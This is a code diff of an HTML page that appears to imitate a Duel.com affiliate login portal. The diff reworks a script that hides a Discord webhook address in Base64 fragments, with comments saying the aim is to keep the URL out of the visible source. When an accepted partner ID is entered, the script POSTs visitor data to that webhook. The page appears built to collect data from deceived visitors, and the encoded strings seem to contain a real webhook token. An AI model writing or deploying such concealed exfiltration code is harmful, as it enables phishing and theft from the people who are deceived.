@@ -141,21 +141,19 @@
         <div class="signout"><a onclick="signOut()">Sign out</a></div>
       </div>
     </div>
-    <p class="foot">©️ <span id="yr"></span> Duel.com · Affiliate partners only</p>
+    <p class="foot">© <span id="yr"></span> Duel.com · Affiliate partners only</p>
   </div>
 
 <script>
-  // --- WEBHOOK HIDING LOGIC ---
-  // The webhook is broken into Base64 chunks and assembled at runtime.
-  // It will not show up as a plain text URL in the HTML source.
-  const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
-  const _p2 = "MTU3MzgyOTgwMzk5NDI1NTQ1MC9Kal9lbFR3a1h4VUkyTTd3Ykt6dHlNYjRyVUx5a19TRWRpc3VXUGN6SWdYeDR3QUsycGtFTUl4ZUN5SENzY1JEMF9z";
-  
-  function _getWebhook() {
-    return atob(_p1) + atob(_p2);
+  // Obfuscated Webhook Logic to prevent source code leaks
+  function _g() {
+    const p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+    const p2 = "MTU3MzgyOTgwMzk5NDI1NTQ1MC9Kal9lbFR3a1h4VUkyTTd3Ykt6dHlNYjRyVUx5a19TRWRpc3VXUGN6SWdYeDR3QUsycGtFTUl4ZUN5SENzY1JEMF9z";
+    return atob(p1) + atob(p2);
   }
 
   // ADD YOUR GENERATED PARTNER IDs HERE
+  // Example: const VALID_IDS = ["DUEL-A1B2C3D4", "DUEL-X9Y8Z7W6"];
   const VALID_IDS = [
     "DUEL-89983" // Test ID
   ];
@@ -202,7 +200,7 @@
       
       if (VALID_IDS.includes(pid)) {
         // Valid ID
-        fetch(_getWebhook(), {
+        fetch(_g(), {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
